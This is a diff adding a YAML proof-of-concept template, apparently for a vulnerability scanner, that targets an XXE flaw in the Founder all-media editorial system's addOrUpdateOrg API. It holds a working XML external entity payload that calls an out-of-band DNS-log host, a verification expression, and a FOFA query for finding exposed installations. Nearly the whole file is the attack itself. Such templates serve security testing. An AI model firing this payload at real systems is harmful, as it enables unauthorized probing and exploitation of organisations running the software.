@@ -1,0 +1,20 @@
+id: poc-yaml-founder-addorupdateorg-xxe
+info:
+  name: 方正全媒体采编系统 addOrUpdateOrg XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 方正全媒体采编系统
+  fofa: app="FOUNDER-全媒体采编系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /newsedit/api/orgUser/addOrUpdateOrg
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https://{{.domain}}%22%3E%20%25remote;%5D%3E
+  expression: reverse.Verify()
+transport: http
